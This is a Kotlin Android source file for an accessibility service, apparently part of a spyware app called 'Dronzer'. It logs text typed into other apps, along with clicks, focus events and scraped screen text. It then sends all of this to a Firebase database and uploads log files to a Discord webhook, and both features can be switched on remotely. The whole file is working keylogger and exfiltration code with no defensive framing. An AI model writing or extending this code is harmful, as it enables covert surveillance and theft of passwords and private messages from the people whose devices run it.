package com.example.dronzer

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.graphics.Rect
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.util.Log
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*
import android.os.Handler
import android.os.Looper
import com.google.firebase.database.FirebaseDatabase

class DronzerAccessibilityService : AccessibilityService() {

    private var logFile: File? = null
    private var isRecording = false
    private var isScraping = false
    private val handler = Handler(Looper.getMainLooper())
    private val timeoutMillis = 30000L // 30 seconds inactivity for upload
    
    private var firebaseRealtimeUrl = ""

    // Realtime Database reference
    private val database by lazy { 
        if (firebaseRealtimeUrl.isNotEmpty()) {
            FirebaseDatabase.getInstance(firebaseRealtimeUrl)
                .getReference("keylogs")
                .child(DeviceManager.deviceId)
        } else {
            FirebaseDatabase.getInstance()
                .getReference("keylogs")
                .child(DeviceManager.deviceId)
        }
    }

    private var lastCapturedText = ""
    private var lastScreenContent = ""

    private val sendRunnable = Runnable {
        Log.d("DronzerAccessibility", "Inactivity timeout reached. Uploading.")
        sendLogsAndReset(">> Key Taps Log (Inactivity Timeout)")
    }

    private val screenCaptureRunnable = Runnable {
        captureScreenContent()
    }

    override fun onCreate() {
        super.onCreate()
        DeviceManager.initialize(applicationContext)
        DiscordManager.initialize(applicationContext)

        val configPrefs = getSharedPreferences("dronzer_config", Context.MODE_PRIVATE)
        firebaseRealtimeUrl = configPrefs.getString("firebase_url", "") ?: ""

        val prefs = getSharedPreferences("dronzer_keys", Context.MODE_PRIVATE)
        isRecording = prefs.getBoolean("is_recording", false)
        isScraping = prefs.getBoolean("is_scraping", false)
        Log.d("DronzerAccessibility", "Service Created. isRecording=$isRecording, isScraping=$isScraping, deviceId=${DeviceManager.deviceId}")
        if (isRecording) initLogFile()
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("DronzerAccessibility", "Service Connected")
        // Critical: Retrieve interactive windows and view IDs
        val info = serviceInfo ?: AccessibilityServiceInfo()
        info.flags = info.flags or 
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
        serviceInfo = info
        checkAndRecoverLogs()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // 1. Keylogger Logic (Immediate)
        if (isRecording) {
            val source = event.source
            captureKeyLogs(event, source)
            source?.recycle()
        }

        // 2. Screen Scraper Logic (Debounced to prevent flooding)
        if (isScraping) {
            val type = event.eventType
            if (type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || 
                type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                type == AccessibilityEvent.TYPE_WINDOWS_CHANGED) {
                
                handler.removeCallbacks(screenCaptureRunnable)
                handler.postDelayed(screenCaptureRunnable, 2000) // Wait 2s for UI to settle
            }
        }
    }

    override fun onInterrupt() {
        Log.d("DronzerAccessibility", "Service Interrupted")
    }

    private fun captureKeyLogs(event: AccessibilityEvent, source: AccessibilityNodeInfo?) {
        var data: String? = null
        val pkg = event.packageName?.toString() ?: "Unknown"
        
        if (pkg == packageName) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text.joinToString("")
                if (text.isNotEmpty() && text != lastCapturedText) {
                    lastCapturedText = text
                    data = "[$pkg] Text: $text"
                }
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                val node = source ?: event.source
                val text = node?.text?.toString() ?: ""
                val desc = node?.contentDescription?.toString() ?: ""
                val label = if (text.isNotEmpty()) text else desc
                if (label.isNotEmpty()) {
                    data = "[$pkg] Focused: [$label]"
                }
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val node = source ?: event.source
                val text = node?.text?.toString() ?: ""
                val desc = node?.contentDescription?.toString() ?: ""
                val label = if (text.isNotEmpty()) text else desc
                if (label.isNotEmpty()) {
                    data = "[$pkg] Clicked: [$label]"
                }
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
                val text = event.text.joinToString("")
                if (text.isNotEmpty() && text != lastCapturedText) {
                    lastCapturedText = text
                    data = "[$pkg] Input: $text"
                }
            }
        }

        data?.let {
            Log.d("DronzerAccessibility", "Captured: $it")
            appendToLog(it)
            sendToRealtimeDatabase(it) 
            resetTimer()
        }
    }

    private fun captureScreenContent() {
        if (!isScraping) return
        
        try {
            val root = rootInActiveWindow ?: return
            val nodes = mutableListOf<NodeData>()
            traverseNode(root, nodes)
            root.recycle()
            
            // Sort by top coordinate, then left coordinate
            nodes.sortWith(compareBy({ it.bounds.top }, { it.bounds.left }))
            
            val sb = StringBuilder()
            var currentTop = -1
            for (node in nodes) {
                // If the top coordinate is significantly different, add a newline
                if (currentTop != -1 && Math.abs(node.bounds.top - currentTop) > 10) {
                    sb.append("\n")
                }
                sb.append(node.text).append("  ")
                currentTop = node.bounds.top
            }
            
            val currentContent = sb.toString().trim()
            if (currentContent.isNotEmpty() && currentContent != lastScreenContent) {
                lastScreenContent = currentContent
                sendScreenContentToFirebase(currentContent)
            }
        } catch (e: Exception) {
            Log.e("DronzerAccessibility", "Screen Scraper Error: ${e.message}")
        }
    }

    private data class NodeData(val text: String, val bounds: Rect)

    private fun traverseNode(node: AccessibilityNodeInfo?, nodes: MutableList<NodeData>) {
        if (node == null) return
        
        val text = node.text?.toString()
        val desc = node.contentDescription?.toString()
        val label = if (!text.isNullOrEmpty()) text else desc
        
        if (!label.isNullOrEmpty()) {
            val bounds = Rect()
            node.getBoundsInScreen(bounds)
            nodes.add(NodeData(label, bounds))
        }
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                traverseNode(child, nodes)
                child.recycle()
            }
        }
    }

    private fun sendScreenContentToFirebase(content: String) {
        val timestamp = System.currentTimeMillis()
        val entry = hashMapOf(
            "content" to content,
            "timestamp" to timestamp,
            "time" to SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date(timestamp))
        )
        database.child("scrscr").push().setValue(entry)
            .addOnSuccessListener {
                Log.d("DronzerAccessibility", "ScrScr Send Success (Length: ${content.length})")
            }
            .addOnFailureListener { e ->
                Log.e("DronzerAccessibility", "ScrScr Send Failure: ${e.message}")
            }
    }
    
    private fun sendToRealtimeDatabase(log: String) {
        val timestamp = System.currentTimeMillis()
        val entry = hashMapOf(
            "log" to log,
            "timestamp" to timestamp,
            "time" to SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date(timestamp))
        )
        database.push().setValue(entry)
            .addOnSuccessListener {
                Log.d("DronzerAccessibility", "RTDB Send Success: $log")
            }
            .addOnFailureListener { e ->
                Log.e("DronzerAccessibility", "RTDB Send Failure: ${e.message}")
            }
    }

    private fun appendToLog(text: String) {
        try {
            if (logFile == null) initLogFile()
            val entry = "[${SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())}] $text\n"
            FileOutputStream(logFile, true).use { it.write(entry.toByteArray()) }
        } catch (e: Exception) {
            Log.e("DronzerAccessibility", "Write error: ${e.message}")
        }
    }

    private fun initLogFile() {
        val dir = applicationContext.cacheDir
        val ts = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        logFile = File(dir, "rec_keytaps_$ts.txt")
        try {
            if (!logFile!!.exists()) logFile!!.createNewFile()
        } catch (e: Exception) {
            Log.e("DronzerAccessibility", "Failed to create log file: ${e.message}")
        }
    }

    private fun resetTimer() {
        handler.removeCallbacks(sendRunnable)
        handler.postDelayed(sendRunnable, timeoutMillis)
    }

    private fun checkAndRecoverLogs() {
        val files = applicationContext.cacheDir.listFiles { f -> f.name.startsWith("rec_keytaps_") && f.length() > 0 }
        files?.forEach { f ->
            if (logFile == null || f.absolutePath != logFile!!.absolutePath) {
                DiscordManager.sendFileToWebhook(f, ">> Recovered Keylogger Log") { s, _ -> if (s) f.delete() }
            }
        }
    }

    private fun sendLogsAndReset(msg: String) {
        val f = logFile
        if (f != null && f.exists() && f.length() > 0) {
            if (isRecording) initLogFile() else logFile = null
            DiscordManager.sendFileToWebhook(f, msg) { s, _ -> if (s) f.delete() }
            database.push().setValue(hashMapOf("event" to "SESSION_UPLOADED", "timestamp" to com.google.firebase.database.ServerValue.TIMESTAMP))
        } else {
            if (!isRecording) { 
                f?.delete()
                logFile = null 
            } else if (logFile == null) {
                initLogFile()
            }
        }
    }

    override fun onStartCommand(intent: android.content.Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            "START_RECORDING" -> {
                Log.d("DronzerAccessibility", "Action: START_RECORDING")
                if (!isRecording) {
                    isRecording = true
                    getSharedPreferences("dronzer_keys", Context.MODE_PRIVATE).edit().putBoolean("is_recording", true).apply()
                    initLogFile()
                    DiscordManager.sendToWebhook(">> Key recording started on `${android.os.Build.MODEL}`")
                    database.push().setValue(hashMapOf("event" to "RECORDING_STARTED", "timestamp" to com.google.firebase.database.ServerValue.TIMESTAMP))
                    resetTimer()
                }
            }
            "STOP_RECORDING" -> {
                Log.d("DronzerAccessibility", "Action: STOP_RECORDING")
                if (isRecording) {
                    isRecording = false
                    getSharedPreferences("dronzer_keys", Context.MODE_PRIVATE).edit().putBoolean("is_recording", false).apply()
                    handler.removeCallbacks(sendRunnable)
                    database.push().setValue(hashMapOf("event" to "RECORDING_STOPPED", "timestamp" to com.google.firebase.database.ServerValue.TIMESTAMP))
                    sendLogsAndReset(">> Key Taps Log (Manual Stop)")
                }
            }
            "START_SCRSCR" -> {
                Log.d("DronzerAccessibility", "Action: START_SCRSCR")
                if (!isScraping) {
                    isScraping = true
                    getSharedPreferences("dronzer_keys", Context.MODE_PRIVATE).edit().putBoolean("is_scraping", true).apply()
                    DiscordManager.sendToWebhook(">> Screen scraping started on `${android.os.Build.MODEL}`")
                    database.child("scrscr").push().setValue(hashMapOf("event" to "SCRSCR_STARTED", "timestamp" to com.google.firebase.database.ServerValue.TIMESTAMP))
                    captureScreenContent()
                }
            }
            "STOP_SCRSCR" -> {
                Log.d("DronzerAccessibility", "Action: STOP_SCRSCR")
                if (isScraping) {
                    isScraping = false
                    getSharedPreferences("dronzer_keys", Context.MODE_PRIVATE).edit().putBoolean("is_scraping", false).apply()
                    handler.removeCallbacks(screenCaptureRunnable)
                    DiscordManager.sendToWebhook(">> Screen scraping stopped on `${android.os.Build.MODEL}`")
                    database.child("scrscr").push().setValue(hashMapOf("event" to "SCRSCR_STOPPED", "timestamp" to com.google.firebase.database.ServerValue.TIMESTAMP))
                }
            }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d("DronzerAccessibility", "Service Destroyed")
    }
}
